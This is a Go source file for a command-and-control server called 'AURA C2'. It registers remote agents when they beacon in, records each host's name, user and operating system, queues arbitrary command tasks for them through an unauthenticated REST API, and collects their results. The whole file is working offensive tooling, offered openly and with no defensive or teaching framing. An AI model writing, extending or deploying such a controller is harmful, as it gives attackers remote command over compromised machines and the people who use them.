/*
AURA C2 SERVER (Controller)

Lightweight C2 command & control server for managing agents.
Features:
- REST API for agent management
- Task queuing
- Result collection
- Agent monitoring
*/
package main

import (
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"sync"
	"time"
)

type Agent struct {
	ID          string    `json:"id"`
	Hostname    string    `json:"hostname"`
	Username    string    `json:"username"`
	OS          string    `json:"os"`
	LastCheckin time.Time `json:"last_checkin"`
	TaskQueue   []Task    `json:"task_queue"`
	mu          sync.Mutex
}

type Task struct {
	ID      string                 `json:"id"`
	Type    string                 `json:"type"`
	Command string                 `json:"command"`
	Args    map[string]interface{} `json:"args"`
	Created time.Time              `json:"created"`
	Status  string                 `json:"status"`
}

type TaskResult struct {
	TaskID    string    `json:"task_id"`
	AgentID   string    `json:"agent_id"`
	Status    string    `json:"status"`
	Output    string    `json:"output"`
	Error     string    `json:"error,omitempty"`
	Timestamp time.Time `json:"timestamp"`
	Duration  float64   `json:"duration_ms"`
}

type C2Server struct {
	agents  map[string]*Agent
	results map[string][]TaskResult
	mu      sync.RWMutex
	port    string
}

func NewC2Server(port string) *C2Server {
	return &C2Server{
		agents:  make(map[string]*Agent),
		results: make(map[string][]TaskResult),
		port:    port,
	}
}

func (s *C2Server) HandleBeacon(w http.ResponseWriter, r *http.Request) {
	var beaconReq struct {
		Agent interface{} `json:"agent"`
		Tasks []int       `json:"completed_tasks"`
	}

	json.NewDecoder(r.Body).Decode(&beaconReq)

	agentData, _ := json.Marshal(beaconReq.Agent)
	var agentInfo Agent
	json.Unmarshal(agentData, &agentInfo)

	s.mu.Lock()
	agent, exists := s.agents[agentInfo.ID]
	if !exists {
		agent = &Agent{
			ID:        agentInfo.ID,
			Hostname:  agentInfo.Hostname,
			Username:  agentInfo.Username,
			OS:        agentInfo.OS,
			TaskQueue: []Task{},
		}
		s.agents[agentInfo.ID] = agent
		fmt.Printf("[+] New agent registered: %s (%s)\n", agentInfo.Hostname, agentInfo.ID)
	}

	agent.LastCheckin = time.Now()
	tasks := agent.TaskQueue
	agent.TaskQueue = []Task{}

	s.mu.Unlock()

	response := map[string]interface{}{
		"tasks":    tasks,
		"action":   "continue",
		"interval": 30,
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(response)
}

func (s *C2Server) HandleResult(w http.ResponseWriter, r *http.Request) {
	var result TaskResult
	json.NewDecoder(r.Body).Decode(&result)

	s.mu.Lock()
	if _, ok := s.results[result.AgentID]; !ok {
		s.results[result.AgentID] = []TaskResult{}
	}
	s.results[result.AgentID] = append(s.results[result.AgentID], result)
	s.mu.Unlock()

	fmt.Printf("[+] Result received from %s (task: %s, status: %s)\n",
		result.AgentID, result.TaskID, result.Status)

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{"status": "ok"})
}

func (s *C2Server) HandleListAgents(w http.ResponseWriter, r *http.Request) {
	s.mu.RLock()
	defer s.mu.RUnlock()

	agents := make([]Agent, 0)
	for _, agent := range s.agents {
		agents = append(agents, *agent)
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"total":  len(agents),
		"agents": agents,
	})
}

func (s *C2Server) HandleExecuteTask(w http.ResponseWriter, r *http.Request) {
	agentID := r.URL.Query().Get("agent")
	if agentID == "" {
		http.Error(w, "Missing agent parameter", 400)
		return
	}

	var task Task
	body, _ := io.ReadAll(r.Body)
	json.Unmarshal(body, &task)

	task.ID = fmt.Sprintf("task-%d", time.Now().Unix())
	task.Created = time.Now()
	task.Status = "pending"

	s.mu.Lock()
	agent, ok := s.agents[agentID]
	if !ok {
		s.mu.Unlock()
		http.Error(w, "Agent not found", 404)
		return
	}

	agent.TaskQueue = append(agent.TaskQueue, task)
	s.mu.Unlock()

	fmt.Printf("[*] Task queued for agent %s: %s\n", agentID, task.ID)

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{"task_id": task.ID})
}

func (s *C2Server) HandleGetResults(w http.ResponseWriter, r *http.Request) {
	agentID := r.URL.Query().Get("agent")

	s.mu.RLock()
	results := s.results[agentID]
	s.mu.RUnlock()

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"agent":   agentID,
		"results": results,
	})
}

func (s *C2Server) Start() {
	http.HandleFunc("/api/c2/beacon", s.HandleBeacon)
	http.HandleFunc("/api/c2/result", s.HandleResult)
	http.HandleFunc("/api/c2/agents", s.HandleListAgents)
	http.HandleFunc("/api/c2/execute", s.HandleExecuteTask)
	http.HandleFunc("/api/c2/results", s.HandleGetResults)

	fmt.Printf("[*] C2 Server listening on :%s\n", s.port)
	log.Fatal(http.ListenAndServe(":"+s.port, nil))
}

func main() {
	server := NewC2Server("9000")
	server.Start()
}
